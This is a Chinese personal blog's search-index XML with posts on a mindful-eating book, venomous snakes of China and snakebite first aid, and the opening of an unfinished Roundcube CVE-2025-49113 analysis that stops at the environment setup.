<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>《 正念饮食 》（ 学会吃饭 ）</title>
      <link href="/2025/06/10/%E7%94%9F%E6%B4%BB/%E7%B2%BE%E7%A5%9E%E9%A3%9F%E7%B2%AE/%E6%AD%A3%E5%BF%B5%E9%A5%AE%E9%A3%9F/"/>
      <url>/2025/06/10/%E7%94%9F%E6%B4%BB/%E7%B2%BE%E7%A5%9E%E9%A3%9F%E7%B2%AE/%E6%AD%A3%E5%BF%B5%E9%A5%AE%E9%A3%9F/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>正念饮食这本书其实很早都买回来了，应该是和 《 正念的奇迹 》一起的，但是一直都没看，最后还卖掉了。《 正念的奇迹 》还留着，因为真的是一本很好的书。</p><p>那么，为什么都卖掉了，还有这篇博客呢？</p><p>因为看到樊登讲书中有这本书，今天上下班的通勤的时候就给听完了，所以简单整理一下主要是个人感悟，读书笔记不太喜欢写，直接贴一下樊登的思维导图就行。</p><p>至于为什么不看，因为感觉太繁杂了，整个一本书讲的其实重点不是特别多，集中在正念，在和食物建立良好关系，所以看了一半就不怎么想继续看下去了。</p><h2 id="导图"><a href="#导图" class="headerlink" title="导图"></a>导图</h2><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/%E6%AD%A3%E5%BF%B5%E9%A5%AE%E9%A3%9F%EF%BC%88%E5%8E%9F%E3%80%8A%E5%AD%A6%E4%BC%9A%E5%90%83%E9%A5%AD%E3%80%8B%EF%BC%89_1749558199255.jpg" alt="正念饮食（原《学会吃饭》）_1749558199255"></p><h2 id="感悟"><a href="#感悟" class="headerlink" title="感悟"></a>感悟</h2><ul><li>培养内在的 “美食家”，美食家会去认真品尝、认真对待食物</li><li>挑剔的 “美食家” ，味蕾的满足要比饱腹感更值得追求</li><li>食物带给我们赖以生存的能量，我们应该对进食感到感恩，而不是为了进食而进食，也不是为了发泄心理的压力而进食。可以因为喜欢这个食物，可以因为开心，抑或是因为控制饮食有点紧也可以去吃，但不要去盲目的或者发泄性的进食</li><li>摒弃要把食物吃完这个概念，并不是全部吃完就睡对食物的尊重，这些多于的食物并不能为你的身体带来好的一面，反而是另一种意义上的浪费食物。吃不完，可以打包，可以放冰箱，下一顿再吃就好了。</li><li>和食物合集，和自己和解</li></ul>]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 精神食粮 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>国内毒蛇（ 一 ）</title>
      <link href="/2025/06/08/%E8%9B%87%E7%B1%BB/%E5%9B%BD%E5%86%85%E6%AF%92%E8%9B%87-01/"/>
      <url>/2025/06/08/%E8%9B%87%E7%B1%BB/%E5%9B%BD%E5%86%85%E6%AF%92%E8%9B%87-01/</url>
      
        <content type="html"><![CDATA[<blockquote><p>内容来源于网络，如有错误请通过微信联系我修正。</p></blockquote><h2 id="银环蛇"><a href="#银环蛇" class="headerlink" title="银环蛇"></a>银环蛇</h2><p>银环蛇，又名雨伞节或银脚带，属眼镜蛇科环蛇属。银环蛇因毒性大而闻名，主要分布于中国华南地区、海南、中南半岛北部以及台湾山区。（ 注：环蛇属中的成员皆为具致命毒素的蛇 ）。它也是我国每年咬死最多人的蛇。</p><p>银环蛇指名亚种主要分布于安徽、澳门、重庆、福建、广东、广西、贵州、海南、湖北、湖南、江西、台湾、香港、云南及浙江。银环蛇云南亚种主要分布于云南西南部。国外见于缅甸、越南北部及老挝。</p><p>毒素类型：神经毒素</p><p>血清：抗银环蛇毒血清（ 根据医院为主 ）</p><p>银环蛇毒素是从银环蛇的毒腺中分泌出来的一类毒液，新鲜毒液呈灰白色，粘稠具有特殊的腥味。银环蛇一次排毒量4.6 mg，人致死量1 mg干毒，是世界十大毒蛇之一。 被银环蛇咬伤的主要症状为伤口疼痛、局部肿胀、嗜睡、运动神经失调、眼睑下垂、瞳孔散大、局部无力、颚咽麻痹、口吃、垂涎、恶心、呕吐、昏迷、呼吸困难、呼吸衰竭，8～72 h内死亡。</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20250608183427353.png?imageSlim" alt="image-20250608183427353"></p><p>咬伤症状</p><ul><li>牙印：微小针孔状 0.6cm ~ 1.cm </li><li>少量流血，很快就不流（10min 左右后按压伤口有麻木无知觉的感觉 ）</li></ul><p>出没时间：</p><ul><li>夜晚居多</li><li>4 ~ 10 月，特别是闷热的夏天</li><li>晚上后，会喜欢爬到空旷、通风的地方（ 大马路 ）</li><li>冬天一般在路基的石缝过冬</li></ul><p>进食喜好（ 河边 ）：</p><ul><li>黄鳝、泥鳅、蛇等长条状物</li></ul><p>数量多，夜间出没，实力差，容易误踩或主动爬到人的附近，被咬后症状不明显，会导致呼吸衰竭死亡，死亡率极高。</p><p>银环蛇为体型中等略为偏大的神经性剧毒蛇。头部椭圆而略扁，身长0.6～1.2米，背部有黑白相间的横纹，腹面、上唇、颈部均呈乳白色，吻端圆钝，同颈部略可区分开来；眼小，瞳孔呈圆形；整个躯体为圆柱形；尾部与其他蛇类比较相对较短，末端略尖细；通身黑白相间的横纹以及扩大成六角形的脊鳞是其最显著的特征，可以借此将其和银环蛇极其相似的链蛇属（<em>Lycodon</em>）的白环链蛇（<em>Lycodon aulicus</em>）区分开来。白色横纹数的多少也是银环蛇与环蛇属其他相近物种区分开的主要特征。</p><p>简单记：黑白横纹，三角背、尾巴相对短细</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/640?imageSlim" alt="img"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/L1090673.jpg?imageSlim" alt="Copy of Many Banded Krait - Yellow Coloration"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/L1030277.jpg?imageSlim" alt="Copy of Many Banded Krait"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/large.jpg?imageSlim" alt="(c) 尹若宇，保留部分权利（CC BY-SA）, 由 尹若宇 上传"></p><h2 id="尖吻蝮"><a href="#尖吻蝮" class="headerlink" title="尖吻蝮"></a>尖吻蝮</h2><p><strong>尖吻蝮属</strong>，是<a href="https://zh.wikipedia.org/wiki/%E8%9B%87%E4%BA%9A%E7%9B%AE">蛇亚目</a><a href="https://zh.wikipedia.org/wiki/%E8%9D%B0%E8%9B%87%E7%A7%91">蝰蛇科</a><a href="https://zh.wikipedia.org/wiki/%E8%9D%AE%E4%BA%9E%E7%A7%91">響尾蛇亞科</a>下的一个<a href="https://zh.wikipedia.org/wiki/%E6%AF%92%E8%9B%87">有毒</a><a href="https://zh.wikipedia.org/wiki/%E5%96%AE%E5%9E%8B">单型</a>蛇<a href="https://zh.wikipedia.org/wiki/%E5%B1%AC">属</a>，属下只有<strong>尖吻蝮</strong>（<em>D. acutus</em>）一种，为排毒量大，攻击性强，毒性亦较强的大型蛇类，又名<strong>百步蛇</strong>。尖吻蝮俗名甚多，又称<strong>白花蛇</strong>、<strong>百花蛇</strong>、<strong>五步蛇</strong>、<strong>七步蛇</strong>、<strong>蕲蛇</strong>、<strong>山谷虌</strong>、<strong>中华蝮</strong>，中医《<a href="https://zh.wikipedia.org/wiki/%E9%96%8B%E5%AF%B6%E6%9C%AC%E8%8D%89">开宝本草</a>》命其名为<strong>褰鼻蛇</strong>，是<a href="https://zh.wikipedia.org/wiki/%E4%BA%9E%E7%86%B1%E5%B8%B6">亚热带</a>地区内相当著名的蛇种，尤其在<a href="https://zh.wikipedia.org/wiki/%E8%8F%AF%E5%8D%97">华南</a>一带更是自古已备受重视的蛇类，为<a href="https://zh.wikipedia.org/wiki/%E5%8F%B0%E7%81%A3%E5%85%AD%E5%A4%A7%E6%AF%92%E8%9B%87">台湾六大毒蛇</a>之一。</p><p>成年的尖吻蝮能达91至121<a href="https://zh.wikipedia.org/wiki/%E5%85%AC%E5%88%86">公分</a>长，目前最长纪录是154.5公分。</p><p>它们的<a href="https://zh.wikipedia.org/wiki/%E9%A0%AD%E9%83%A8">头部</a>尖端呈突出状，被形容为短小的鳞角，这枚鳞角根据各蛇体质之异而长度不一。尖吻蝮的头部长有<a href="https://zh.wikipedia.org/wiki/%E9%A0%B0%E7%AA%A9">颊窝</a>，即<a href="https://zh.wikipedia.org/wiki/%E7%BA%A2%E5%A4%96%E7%BA%BF">红外线</a>感受器。</p><p>是亚洲最危险的毒蛇之一，主要是因为天性稳重、受到惊扰也会停在原地，仅发出喷气声，令人类无法适应其毫无先兆的攻击性。（ 蝮蛇都是这样老阴逼，等你靠近或者踩到给你一口，<strong>攻击前没有任何警告动作</strong> ）</p><p>毒素：血循毒素（ 又被称为”烂肉王”，黄金救助时间是40分钟 ）</p><p>血清：抗五步蛇毒血清（ 根据医院为主 ）</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20250608190419653.png?imageSlim" alt="image-20250608190419653"></p><p>很好辨认：尖吻，三角纹（A 型）</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20250608190544685.png?imageSlim" alt="image-20250608190544685"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20250608190559970.png?imageSlim" alt="image-20250608190559970"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20250608190707109.png?imageSlim" alt="image-20250608190707109"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20250608190735367.png?imageSlim" alt="image-20250608190735367"></p><h2 id="舟山眼镜蛇"><a href="#舟山眼镜蛇" class="headerlink" title="舟山眼镜蛇"></a>舟山眼镜蛇</h2><p>舟山眼镜蛇为眼镜蛇科眼镜蛇属的中大型前沟牙类毒蛇。头椭圆形，与颈不易区分。受惊时常直立起前半身，颈部平扁扩大，做攻击姿态。颈后有一宽大的白色饰纹，形态较为多变。体背面黄褐色、深褐色或黑色，具若干条白色横纹，少数个体无横纹或不明显。（ 又叫中华眼镜蛇 ）</p><p>舟山眼镜蛇的分布范围包括<a href="https://www.baike.com/wikiid/7151355539733086240">四川</a>、<a href="https://www.baike.com/wikiid/7207657006361034767">云南</a>、<a href="https://www.baike.com/wikiid/7207652867522510886">贵州</a>、<a href="https://www.baike.com/wikiid/7207679453085990969">安徽</a>、湖北、<a href="https://www.baike.com/wikiid/7158714367864733704">浙江</a>、<a href="https://www.baike.com/wikiid/7207655380359315508">江西</a>、<a href="https://www.baike.com/wikiid/7185393014146170892">湖南</a>、<a href="https://www.baike.com/wikiid/7148787714929950754">福建</a>、台湾、<a href="https://www.baike.com/wikiid/7182136497440571403">广西</a>、<a href="https://www.baike.com/wikiid/7164590188621725707">海南</a>、<a href="https://www.baike.com/wikiid/7158714370888548389">香港</a>和<a href="https://www.baike.com/wikiid/7152490205819437095">广东</a>（全省分布）。</p><p>常见于农田、灌丛、溪边等地。捕食蛙类、蜥蜴、蛇类、鸟类、鱼类等。在中国长江以南大部分省区均有分布，中国以外分布于越南、老挝、柬埔寨。</p><p>舟山眼镜蛇通常被认为是白天活动的蛇，在春季和秋季这种观点通常是正确的，因为夜间的环境温度较低，眼镜蛇很少在夜间活动。然而，在炎热的夏季（6月至8月），中华眼镜蛇不仅在白天活动，而且在夜间也很活跃。</p><p>毒素：神经性和血循性混合毒，一次咬物排毒量约为79.1毫克，是人体致死量的5倍。（ 眼镜蛇不会和蝮蛇那样老阴逼，一般都会立起来发生声音警示 ）</p><p>中华眼镜蛇咬伤后并没有明显的<a href="https://www.baike.com/wikiid/265916716499161233">神经毒素</a>引起的呼吸麻痹现象。常见的症状包括疲倦、流涎、吞咽困难等，很少出现肾功能衰竭。</p><p>血清：抗眼镜蛇毒血清（ 根据医院为主 ）</p><p>颈背可见“双片眼镜”状斑纹，部分个体“眼镜”状斑纹不规则或不显。体色一般黑褐色或暗褐色，背面有或无白色细横纹，幼蛇多有之，随年龄增长渐模糊不清甚至全无；腹面前段污白色，后部灰黑色或灰褐色。典型斑纹是在腹面前段基色浅淡的基础上，大约在第10枚腹鳞前后有一道3～4枚腹鳞宽的灰黑横纹，在此横纹之前数枚腹鳞两侧各有一粗大黑点斑。</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/4904aaf1-24a6-49ea-a63e-7357419bf2b2.jpg?imageSlim" alt="img"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/6bf3f86b-a927-4cd6-baf6-a880783bc80e.jpg?imageSlim" alt="img"></p><p><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTyM9S1tXkyOdtZQhCYVlGaExPCDGaoT8U4fgIHoBXASU68Lj2okh-R9sK3JDEKUY1j_XBiiQcLRQQrLr0ntmQKxFuRFu2ZJcoVyAjib7ds" alt="Chinese Cobra (Naja atra)"></p><h2 id="短尾蝮"><a href="#短尾蝮" class="headerlink" title="短尾蝮"></a>短尾蝮</h2><p>短尾蝮为<a href="https://zh.wikipedia.org/wiki/%E8%9D%B0%E7%A7%91">蝰科</a><a href="https://zh.wikipedia.org/wiki/%E4%BA%9E%E6%B4%B2%E8%9D%AE%E5%B1%AC">亚洲蝮属</a>的<a href="https://zh.wikipedia.org/wiki/%E7%88%AC%E8%A1%8C%E5%8A%A8%E7%89%A9">爬行动物</a>，俗名七寸子、土巴蛇、土蝮蛇、土夫蛇、土公蛇。</p><p>分布于<a href="https://zh.wikipedia.org/wiki/%E6%9C%9D%E9%B2%9C%E5%8D%8A%E5%B2%9B">朝鲜半岛</a>以及<a href="https://zh.wikipedia.org/wiki/%E4%B8%AD%E5%9B%BD%E5%A4%A7%E9%99%86">中国大陆</a>的<a href="https://zh.wikipedia.org/wiki/%E5%8C%97%E4%BA%AC">北京</a>、<a href="https://zh.wikipedia.org/wiki/%E5%A4%A9%E6%B4%A5">天津</a>、<a href="https://zh.wikipedia.org/wiki/%E6%B2%B3%E5%8C%97">河北</a>、<a href="https://zh.wikipedia.org/wiki/%E6%B2%B3%E5%8D%97">河南</a>、<a href="https://zh.wikipedia.org/wiki/%E8%BE%BD%E5%AE%81">辽宁</a>、<a href="https://zh.wikipedia.org/wiki/%E4%B8%8A%E6%B5%B7">上海</a>、<a href="https://zh.wikipedia.org/wiki/%E6%B1%9F%E8%8B%8F">江苏</a>、<a href="https://zh.wikipedia.org/wiki/%E6%B5%99%E6%B1%9F">浙江</a>、<a href="https://zh.wikipedia.org/wiki/%E5%AE%89%E5%BE%BD">安徽</a>、<a href="https://zh.wikipedia.org/wiki/%E7%A6%8F%E5%BB%BA">福建</a>、<a href="https://zh.wikipedia.org/wiki/%E6%B1%9F%E8%A5%BF">江西</a>、<a href="https://zh.wikipedia.org/wiki/%E6%B9%96%E5%8C%97">湖北</a>、<a href="https://zh.wikipedia.org/wiki/%E6%B9%96%E5%8D%97">湖南</a>、<a href="https://zh.wikipedia.org/wiki/%E5%9B%9B%E5%B7%9D">四川</a>、<a href="https://zh.wikipedia.org/wiki/%E8%B4%B5%E5%B7%9E">贵州</a>、<a href="https://zh.wikipedia.org/wiki/%E9%99%95%E8%A5%BF">陕西</a>、<a href="https://zh.wikipedia.org/wiki/%E7%94%98%E8%82%83">甘肃</a>等地，多栖息于在长江中下游平原丘陵地区以及主要栖息于坟堆草丛及其附近。其生存的海拔上限为1100米。该物种的模式产地在釜山。</p><p>短尾蝮毒液为混合毒，其中以血循毒为主。被咬后伤口周围剧烈疼痛、红肿、皮下淤血。临床表现为头晕、视物模糊及复视、恶性呕吐症状，严重者会出现休克、呼吸麻痹和急性肾功能衰竭。</p><p>血清：抗蝮蛇毒血清（ 根据医院为主 ）</p><p>体型短粗，头略呈三角形，与颈区分明显。头侧具1条黑色或黑褐色眉纹，上、下缘镶白边。通身背面黄褐色、灰褐色、黑褐色或肉红色。身体两侧各具1行大圆斑，圆斑在脊部交错或并列，少数融合。</p><p>简单记：白眉大侠，体型粗短，两边都是大圆斑</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20250608185350767.png?imageSlim" alt="image-20250608185350767"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20250608185332603.png?imageSlim" alt="image-20250608185332603"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20250608185801337.png?imageSlim" alt="image-20250608185801337"></p><h2 id="竹叶青"><a href="#竹叶青" class="headerlink" title="竹叶青"></a>竹叶青</h2><p>竹叶青蛇是蝰科（ 也是蝮亚科 ）的一种，属于竹叶青蛇属，又名青竹蛇，焦尾巴。主要分布在亚洲的印度、东南亚、中国以及太平洋上的岛屿，共有三十多种，台湾称为青竹丝，属于破坏血小板凝固功能的出血性毒蛇。</p><p>竹叶青有很多光国内就有不少了，福建竹叶青蛇、白唇竹叶青蛇、四川竹叶青蛇……………</p><p>由于太多了这里就不列了，除过一些特殊的竹叶青比如海岛、西藏竹叶青蛇…. 的大部分都是绿色，比较好辨认</p><p>需要注意的是竹叶青是树栖蛇，会喜欢盘在树上，所以被咬就不是下半身了，很可能是脖子、头部。</p><p>毒素：血循毒为主的混合毒液类，主要破坏被咬伤者的凝血系 统,使其出现轻度凝血功能障碍,少部分可出现弥 散性血管内凝血、脑梗塞以及中毒型休克等严重并发症</p><p>血清：抗蝮蛇毒血清 抗五步蛇毒血清（ 根据医院为主 ）</p><p>三角头 翠绿色 ：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/6c224f4a20a4462309f710a33a7a650e0cf3d6ca79e3?imageSlim" alt="img"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/e850352ac65c103853433e45315a8413b07ecb8023aa?imageSlim" alt="img"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/5f15e1721f1f45b6a605297bfed650ca.jpg?imageSlim" alt="生态云南| 蛇类顶级隐藏大师竹叶青蛇"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/300?imageSlim" alt="竹叶青摄影图-竹叶青图片大全-竹叶青照片-摄图新视界"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/21a4462309f790529822f0ffaeabc0ca7bcb0b467fe3?imageSlim" alt="img"></p><p>欣赏一下海岛竹叶青的美丽（抖音上截图的，剧毒不要饲养）：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20250608201521611.png?imageSlim" alt="image-20250608201521611"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20250608201608526.png?imageSlim" alt="image-20250608201608526"></p><p><img src="https://scontent-hkg1-2.xx.fbcdn.net/v/t1.6435-9/57368818_420276078531627_988620296657305600_n.jpg?_nc_cat=103&ccb=1-7&_nc_sid=127cfc&_nc_ohc=Um0kDYnQH8kQ7kNvwGZTK2u&_nc_oc=AdntXgQITEveJuG_iGF4tGh1PR_-7C9zSu7fAnoVxYth94fD0uKaQl4tPCMj8D8-g5g&_nc_zt=23&_nc_ht=scontent-hkg1-2.xx&_nc_gid=bh4rfFnwium6-v0K3Au3Tg&oh=00_AfNLW7oGW6D_ALenR_TFFUsKtuTaecB_Eg10Yd2idDXrLg&oe=686CD8C1" alt="img"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20250608201724546.png?imageSlim" alt="image-20250608201724546"></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li>龙雅大佬</li><li>青峰侠</li><li>黄锋说蛇</li><li><a href="https://www.hongkongsnakeid.com/many-banded-krait-1">https://www.hongkongsnakeid.com/many-banded-krait-1</a></li><li>维基百科</li><li>百度百科</li><li>快懂百科</li><li>抖音图片</li></ul>]]></content>
      
      
      <categories>
          
          <category> 爱好 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 蛇类 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>国内毒蛇血清及被咬后处理方式</title>
      <link href="/2025/06/08/%E8%9B%87%E7%B1%BB/%E6%AF%92%E8%9B%87%E8%A1%80%E6%B8%85/"/>
      <url>/2025/06/08/%E8%9B%87%E7%B1%BB/%E6%AF%92%E8%9B%87%E8%A1%80%E6%B8%85/</url>
      
        <content type="html"><![CDATA[<blockquote><p>本文大部分知识主要来自于 &lt;&lt;中华急诊医学杂志 2024 年 7 月第 33 卷第 7 期 Chin J Emerg Med, July 2024, Vol. 33, No. 7 ] 中国蛇伤救治指南&gt;&gt;。</p><p>推荐看一下，PDF 链接在参考链接有，本文主要是摘出一些做一些简单的整理。如有错误请通过微信联系我修正。</p></blockquote><h2 id="当地血清医院"><a href="#当地血清医院" class="headerlink" title="当地血清医院"></a>当地血清医院</h2><p>如果快速寻找当地具备相关血清的医院？</p><ul><li>微信小程序：<strong>赛伦100蛇伤防治</strong></li></ul><h2 id="国内血清种类"><a href="#国内血清种类" class="headerlink" title="国内血清种类"></a>国内血清种类</h2><table><thead><tr><th>类型</th><th>介绍</th></tr></thead><tbody><tr><td>抗蝮蛇毒血清</td><td>主要中和普通血循毒和少量突触前神经毒</td></tr><tr><td>抗五步蛇毒血清</td><td>主要中和抗凝血型血循毒</td></tr><tr><td>抗银环蛇毒血清</td><td>主要中和突触后神经毒和突触前神经毒</td></tr><tr><td>抗眼镜蛇毒血清</td><td>主要中和细胞毒、突触后神经毒和少量普通血循毒</td></tr></tbody></table><h2 id="蛇伤处理"><a href="#蛇伤处理" class="headerlink" title="蛇伤处理"></a>蛇伤处理</h2><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20250608102901568.png?imageSlim" alt="image-20250608102901568"></p><p>如果被咬，我们可以做什么？</p><ul><li>脱离：立即远离发生咬伤的区域，遇有蛇咬住不放时，可用棍棒或其他工具促使其脱离</li><li>认蛇：毒蛇种类，如果不是相关爱好者是不清楚毒蛇种类的，所以如果可以的话拍照片或者记住该蛇特征（ 头型、体纹和颜色 ）。切勿 企图捕杀致伤蛇，避免二次受伤。</li><li>镇定：蛇伤后的紧张、恐慌等会加速血液循环，促进 毒素吸收。尽量保持冷静，平复情绪，因为部分是“干咬”， 且中毒症状需要一定时间才发生，及时救治是可痊愈的。</li><li>呼救：<strong>赛伦100蛇伤防治</strong> 小程序寻找当地医院，拨打 120</li><li>解压：摘掉受伤肢体饰物，如戒指、手镯、手表、脚链，脱去紧身衣袖或裤子等，以免加重局部伤害，伤口可用清 水简单冲洗。</li><li>制动：活动有促进毒素吸收的风险，被毒蛇咬伤后应尽量全身性制动，尤其受伤肢体制动，可用夹板或就地取材固定伤肢以保持制动；伤者保持坐位或斜靠位，受伤部位或肢体处于相对低位（保持在心脏水平以下），以利减少回心血量，减缓毒素吸收或扩散。</li></ul><p>处置禁忌：</p><ul><li>裸手捡拾或 触碰看似死亡</li><li>的毒蛇</li><li>等待症状发作以确定是否中毒</li><li>用止血带结扎 、用刀去切割伤口（牙痕）、企图用嘴吸出毒素、 用冰敷或将伤口浸入冰水中、饮酒止痛或喝咖啡饮料、用烧灼等方法处理伤口</li></ul><p>目前的确有可以检测蛇毒的手段，但是需要注意的是，有检测手段并不代表就医医院有检测手段。</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20250608103912567.png?imageSlim" alt="image-20250608103912567"></p><h2 id="毒蛇预防"><a href="#毒蛇预防" class="headerlink" title="毒蛇预防"></a>毒蛇预防</h2><p>人被毒蛇咬伤以后，毒液注入人体的皮下组织或肌肉组织的淋巴间隙中，随淋巴液慢慢扩散，最后进入静脉，随血液流至身体各处。这扩散比较缓慢，如及时抢救，病情可大大减轻。如毒液直接注入血液，则中毒较快，因此我们在多蛇地区要预防毒蛇咬伤，以预防为主。</p><p>一般说来春暖以后直到晚秋是蛇的活动季节，特别是 7-9 月，气候炎热，雨量丰富，蛇类特别活跃，人被咬伤的机会也多。毒蛇常以蛙类、鸟类和鼠类等为食，它每天活动的时间与捕食对象的活动时间有关。</p><p>一般毒蛇都喜欢栖居在废鼠洞和其它动物洞穴中，因此居民点附近的鼠洞最好加以堵塞，草丛、乱石也是毒蛇藏身之处，要注意清除。</p><p>所以我们可以在哪些地方进行预防？</p><ul><li>活动时间：避开蛇类高峰活动时间。 7-9 月傍晚天气凉快后减少在外的活动时间</li><li>活动地点：避开蛇类活动地点，比如河边、草丛、乱石 （ 城市里就是公园等地区 ）</li></ul><h2 id="毒蛇分类"><a href="#毒蛇分类" class="headerlink" title="毒蛇分类"></a>毒蛇分类</h2><p>毒蛇种类繁多，临床上根据蛇毒对人体的毒性效应， 分为神经毒、血液毒和细胞毒类蛇。每种毒蛇可同时含多 种不同毒素。</p><h2 id="临床表现"><a href="#临床表现" class="headerlink" title="临床表现"></a>临床表现</h2><p>毒蛇咬伤的临床表现受这几个方面影响：</p><ul><li>蛇毒种类</li><li>注毒量：毒蛇的毒牙是类似中空，然后注毒，所以可能会干咬，也可能会注入大量毒素（ 具体情况要看毒素多少 ）</li><li>被咬伤后至就诊时长</li></ul><p>神经毒性三联征：</p><ul><li>双侧眼睑下垂、下行性麻痹</li><li>呼吸困难&#x2F;急性呼吸衰竭</li></ul><p>血液毒性三联征：</p><ul><li>蛇毒诱发的消耗性凝血病</li><li>局部出血和全身性出血</li></ul><p>细胞毒性三联征：</p><ul><li>严重疼痛、进行性肿胀和组织损伤</li></ul><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20250608181308120.png?imageSlim" alt="image-20250608181308120"></p><h2 id="毒蛇价值"><a href="#毒蛇价值" class="headerlink" title="毒蛇价值"></a>毒蛇价值</h2><p>毒蛇蛇毒有着极高的医用价值，被称为液体黄金。并且我国大部分毒蛇都属于保护动物，除繁殖厂家那种是不能私自饲养的。</p><h2 id="目前国内无血清的危险毒蛇"><a href="#目前国内无血清的危险毒蛇" class="headerlink" title="目前国内无血清的危险毒蛇"></a>目前国内无血清的危险毒蛇</h2><h3 id="泰国圆斑蝰"><a href="#泰国圆斑蝰" class="headerlink" title="泰国圆斑蝰"></a>泰国圆斑蝰</h3><blockquote><p>注：命名是因为泰国发现而不是说只分布在泰国，该蛇泰国多所以泰国有相关血清，但是国内目前没有</p></blockquote><p>蝰科圆斑蝰属，又称百步金钱豹、金钱斑、圆斑蝰。身体全长1.2米左右。</p><p>特征：头较大，略呈三角形，头颈区分明显，没有颊窝；体粗壮而尾短。体尾背面棕揭色，有 3 行镶黄边的深色大圆斑纵贯全身。</p><ul><li>别名金钱斑，可以看到它的身体上的花纹就是铜钱模样的原斑</li></ul><p>国内分布：广东、福建、广西、台湾、云南</p><p>毒素类型：以血循毒为主的混合毒，会导致急性肾损伤</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/resize%2Cm_lfit%2Climit_1%2Cw_536.png?imageSlim" alt="img"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/resize%2Cm_lfit%2Climit_1%2Ch_336.png?imageSlim" alt="img"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/resize%2Cm_lfit%2Climit_1%2Ch_1080.png?imageSlim" alt="img"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/resize%2Cm_lfit%2Climit_1%2Ch_1080-17493514419714.png?imageSlim" alt="泰国圆斑蝰"></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://icuguideline.com/wp-content/uploads/2024/07/%E4%B8%AD%E5%9B%BD%E8%9B%87%E4%BC%A4%E6%95%91%E6%B2%BB%E6%8C%87%E5%8D%97.pdf">https://icuguideline.com/wp-content/uploads/2024/07/%E4%B8%AD%E5%9B%BD%E8%9B%87%E4%BC%A4%E6%95%91%E6%B2%BB%E6%8C%87%E5%8D%97.pdf</a></li><li><a href="http://www.kiz.cas.cn/kxcb/kp2/kp22/202201/t20220127_6349842.html">http://www.kiz.cas.cn/kxcb/kp2/kp22/202201/t20220127_6349842.html</a></li><li><a href="https://baike.baidu.com/item/%E6%B3%B0%E5%9B%BD%E5%9C%86%E6%96%91%E8%9D%B0/62732511">https://baike.baidu.com/item/%E6%B3%B0%E5%9B%BD%E5%9C%86%E6%96%91%E8%9D%B0/62732511</a></li><li><a href="https://www.cas.cn/kxcb/kpwz/201111/t20111117_3397674.shtml">https://www.cas.cn/kxcb/kpwz/201111/t20111117_3397674.shtml</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 爱好 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 蛇类 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2025-49113 Roundcube Webmail 反序列化漏洞分析 [未完成]</title>
      <link href="/2025/06/06/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/CVE-2025-49113/"/>
      <url>/2025/06/06/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/CVE-2025-49113/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><p>漏洞名称：CVE-2025-49113 Roundcube Webmail 认证后反序列化漏洞</p><p>影响版本：version &lt; 1.5.10, version &lt; 1.6.11</p><p>漏洞原理</p><p>项目地址：<a href="https://github.com/roundcube/roundcubemail">https://github.com/roundcube/roundcubemail</a></p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>搭建版本：1.6.10</p><p>可以使用 Docker 搭建：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs 